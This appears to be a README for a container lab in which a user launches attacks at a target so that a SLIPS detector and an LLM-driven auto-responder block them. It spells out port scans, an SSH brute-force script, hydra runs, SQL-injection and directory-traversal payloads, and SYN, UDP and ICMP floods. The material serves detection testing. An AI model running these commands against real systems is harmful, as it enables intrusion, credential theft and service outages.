# Manual Attack Commands

This document contains manual commands to perform attacks from the compromised container and watch the automated response system work.

## 🚀 Quick Start

1. **Start the system:**
```bash
cd /home/shared/Trident
make up
make verify
```

## ✅ Verification (SSH defender setup)
- `docker compose build slips_defender`
- `docker compose up -d`
- `docker exec lab_slips_defender which ssh`
- `docker exec lab_slips_defender ls -la /root/.ssh`
- `docker exec lab_slips_defender /opt/lab/setup_ssh_keys.sh`
- `docker exec lab_slips_defender ssh -i /root/.ssh/id_rsa_auto_responder -p 22 root@172.31.0.10 'echo ok'`
- `docker exec lab_slips_defender ssh -i /root/.ssh/id_rsa_auto_responder -p 22 root@172.30.0.10 'echo ok'`

2. **Connect to compromised container:**
```bash
ssh labuser@127.0.0.1 -p 2223
# Password from your .env file
sudo su
```

3. **Watch real-time logs (in separate terminal):**
```bash
# Watch all alerts being processed
tail -f /outputs/${RUN_ID}/defender_alerts.ndjson

# Watch auto responder logs (high-threat alerts only)
tail -f /outputs/${RUN_ID}/auto_responder_detailed.log

# Watch execution results
tail -f /outputs/${RUN_ID}/executions.jsonl
```

## 🎯 **How It Works Now**

### **Alert Filtering:**
- ✅ **Only processes HIGH and CRITICAL threat level alerts**
- ✅ **Skips heartbeat and low-threat messages automatically**
- ✅ **Ignores repeat alerts from same source to same target**
- ✅ **In-memory tracking of recent alert combinations**

### **Execution Flow:**
1. **SLIPS Detection**: Network traffic → PCAP → JSON alerts
2. **Alert Filtering**: `threat_level: high/critical` → Process others → Skip
3. **Deduplication**: Same `source→dest→attack_type` within timeframe → Skip
4. **LLM Planning**: Generate remediation plan using OpenAI API
5. **SSH Execution**: `ssh root@target_ip "opencode run 'plan'"`

### **Repeat Detection Logic:**
- Uses key format: `{source_ip}->{dest_ip}->{attack_id}`
- Tracks in memory (keeps last 100 combinations)
- Different alerts from same source → Will process
- Same alert from same source → Will skip for a period

## 🔥 Manual Attack Commands

### 1. Port Scanning (nmap)
```bash
# Basic port scan
nmap -sS -p 1-1000 172.31.0.10

# Aggressive scan
nmap -A -T4 -p 22,80,443,5432 172.31.0.10

# Full port scan with version detection
nmap -sV -sC -p- 172.31.0.10

# SYN flood scan (triggers more alerts)
nmap -sS -T5 -p 1-1000 172.31.0.10
```

### 2. SSH Brute Force
```bash
# Install required tools
apt-get update && apt-get install -y hydra sshpass

# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://172.31.0.10

# Manual brute force script
cat > /tmp/ssh_brute.sh << 'EOF'
#!/bin/bash
TARGET="172.31.0.10"
USERS=("root" "admin" "user" "postgres" "ubuntu")
PASSWORDS=("password" "123456" "admin" "root")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "Trying $user:$pass"
        sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$user@$TARGET" "echo 'Success'" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "SUCCESS: $user:$pass"
            exit 0
        fi
        sleep 0.1
    done
done
EOF

chmod +x /tmp/ssh_brute.sh
/tmp/ssh_brute.sh
```

### 3. Web Application Attacks
```bash
# HTTP flood attack
for i in {1..100}; do
    curl -s "http://172.31.0.10/" &
    curl -s "http://172.31.0.10/index.html" &
done
wait

# SQL Injection attempts
curl -X POST "http://172.31.0.10/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=' OR '1'='1"

# Directory traversal
curl "http://172.31.0.10/files?path=../../../../etc/passwd"

# Admin panel access attempts
curl -u "admin:admin" "http://172.31.0.10/admin"
curl -u "admin:password" "http://172.31.0.10/admin"
```

### 4. Denial of Service Attacks
```bash
# Install hping3 if not available
apt-get install -y hping3

# TCP SYN flood
hping3 -S -p 80 --flood 172.31.0.10

# UDP flood
hping3 --udp --flood -p 53 172.31.0.10

# ICMP flood
ping -f 172.31.0.10

# Connection flood with netcat
for i in {1..50}; do
    nc -zv 172.31.0.10 22 &
    nc -zv 172.31.0.10 80 &
    nc -zv 172.31.0.10 443 &
done
wait
```

### 5. Suspicious Connection Patterns
```bash
# Port scan multiple services
for port in 22 23 53 80 135 139 443 993 995 1433 3306 5432 3389; do
    nc -zv 172.31.0.10 $port &
    sleep 0.1
done
wait

# Multiple SSH connection attempts
for i in {1..20}; do
    timeout 1 ssh -o StrictHostKeyChecking=no root@172.31.0.10 "echo 'Connection $i'" &
done
wait

# Abnormal DNS queries
nslookup evil.com 172.31.0.10
dig @172.31.0.10 malicious.domain.com
```

### 6. Data Exfiltration Attempts
```bash
# PostgreSQL database attempts
psql -h 172.31.0.10 -U postgres -d labdb -c "SELECT version();" 2>/dev/null
psql -h 172.31.0.10 -U postgres -d labdb -c "SELECT * FROM pg_user;" 2>/dev/null

# MySQL attempts
mysql -h 172.31.0.10 -u root -p"password" -e "SHOW DATABASES;" 2>/dev/null
mysql -h 172.31.0.10 -u admin -p"admin" -e "SHOW TABLES;" 2>/dev/null

# FTP attempts
echo "user anonymous anonymous" | ftp -n 172.31.0.10 2>/dev/null << 'EOF'
ls
quit
EOF

# Telnet attempts
telnet 172.31.0.10 22
telnet 172.31.0.10 80
```

## 📊 Monitor the Automated Response

### Watch Logs in Real-Time
```bash
# Terminal 1: Watch alerts being detected
tail -f /outputs/${RUN_ID}/defender_alerts.ndjson

# Terminal 2: Watch auto responder activity
tail -f /outputs/${RUN_ID}/auto_responder_detailed.log

# Terminal 3: Watch structured timeline
tail -f /outputs/${RUN_ID}/auto_responder_timeline.jsonl

# Terminal 4: Watch SLIPS alerts
find /outputs/${RUN_ID}/slips_output -name "alerts.log" -exec tail -f {} \;
```

### Check System Status
```bash
# Check all containers running
docker ps --filter "name=lab_"

# Check services healthy
curl -f http://127.0.0.1:8000/health  # Defender API
curl -f http://127.0.0.1:8001/healthz  # Planner API

# Check auto responder running
docker exec lab_slips_defender ps aux | grep auto_responder
```

### Verify Remediation
```bash
# Check firewall rules
docker exec lab_server iptables -L -n | grep DROP

# Check what's been blocked
docker exec lab_server iptables -L INPUT -n | grep 172.30.0.10

# Check running processes
docker exec lab_server netstat -tlnp

# Check execution logs
cat /outputs/${RUN_ID}/executions.jsonl
```

## 🎯 Expected Timeline

When you perform attacks, you should see:

1. **T+0s** - You start the attack
2. **T+5-30s** - SLIPS processes PCAP and generates alerts
3. **T+30-35s** - Auto responder detects new alerts
4. **T+35-37s** - Planner generates remediation plans
5. **T+37-42s** - SSH executes OpenCode on target
6. **T+42s** - Remediation complete (IP blocked, services secured)

## 📋 Attack Examples

### Quick Port Scan Test
```bash
# In one terminal (monitoring)
tail -f /outputs/${RUN_ID}/auto_responder_detailed.log

# In another terminal (attack)
ssh labuser@127.0.0.1 -p 2223
sudo su
nmap -sS -p 22,80,443 172.31.0.10
```

### Quick SSH Brute Force Test
```bash
# In one terminal (monitoring)
tail -f /outputs/${RUN_ID}/auto_responder_timeline.jsonl

# In another terminal (attack)
ssh labuser@127.0.0.1 -p 2223
sudo su
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.31.0.10 -V
```

### Quick Web Attack Test
```bash
# In one terminal (monitoring)
tail -f /outputs/${RUN_ID}/executions.jsonl

# In another terminal (attack)
ssh labuser@127.0.0.1 -p 2223
sudo su
for i in {1..20}; do curl -s "http://172.31.0.10/" & done
wait
```

## 📁 Log Files

All logs are stored in `/outputs/${RUN_ID}/`:

- `defender_alerts.ndjson` - Alerts received from SLIPS
- `auto_responder_detailed.log` - Detailed activity logs
- `auto_responder_timeline.jsonl` - Structured timeline
- `executions.jsonl` - Execution details with I/O
- `processed_alerts.json` - Tracks processed alerts

That's it! Use these manual commands to perform real attacks and watch the automated response system work in real-time.
